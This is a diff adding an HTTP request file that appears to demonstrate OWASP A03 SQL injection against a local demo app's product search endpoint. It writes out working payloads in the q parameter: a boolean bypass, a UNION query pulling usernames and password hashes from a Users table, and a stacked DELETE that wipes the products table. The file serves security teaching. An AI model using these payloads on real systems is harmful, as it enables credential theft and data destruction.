@@ -1,0 +1,48 @@
+### =============================================================
+### OWASP A03 – Injection (SQL Injection)
+### =============================================================
+### The search parameter ?q= is embedded into a raw SQL statement
+### without any sanitisation:
+###   SELECT * FROM Products WHERE Name LIKE '%{q}%'
+###
+### Attack vectors:
+###   (a) Exfiltrate all rows (OR 1=1)
+###   (b) Read other tables (UNION-based)
+###   (c) Delete data (stacked query)
+### =============================================================
+
+@baseUrl = http://localhost:5218
+
+
+### --- Normal request (reference) ---
+# Search for "laptop" – expected result: 1 product
+GET {{baseUrl}}/products/search?q=laptop
+
+###
+
+### --- (a) Boolean-based bypass: exfiltrate every product ---
+# The condition becomes always true: '%' OR '1'='1
+# Expected (secure): only products containing "' OR '1'='1" → 0 results
+# Actual:            EVERY product in the database ✓ VULNERABILITY
+#
+# The query becomes: ... WHERE Name LIKE '%' OR '1'='1%' ...
+GET {{baseUrl}}/products/search?q=' OR '1'='1
+
+###
+
+### --- (b) UNION-based: read another table ---
+# Reads usernames and password hashes from the Users table.
+# SQLite UNION: the column count must match (Products has 6 columns).
+# The query becomes: ... LIKE '%x%' UNION SELECT Id,Username,Email,0,0,PasswordHash FROM Users--
+# Mapping: Id→Id, Username→Name, Email→Description, 0→Price, 0→Stock, PasswordHash→Category
+GET {{baseUrl}}/products/search?q=x' UNION SELECT Id,Username,Email,0,0,PasswordHash FROM Users--
+
+###
+
+### --- (c) Destructive: delete every product ---
+# ⚠️ WARNING: this really deletes every product from the in-memory database!
+#    Afterwards GET /products returns an empty array.
+#    Restart the app to restore the seed data.
+#
+# The query becomes: ... LIKE '%x'; DELETE FROM Products;--'%'
+GET {{baseUrl}}/products/search?q=x'; DELETE FROM Products;--
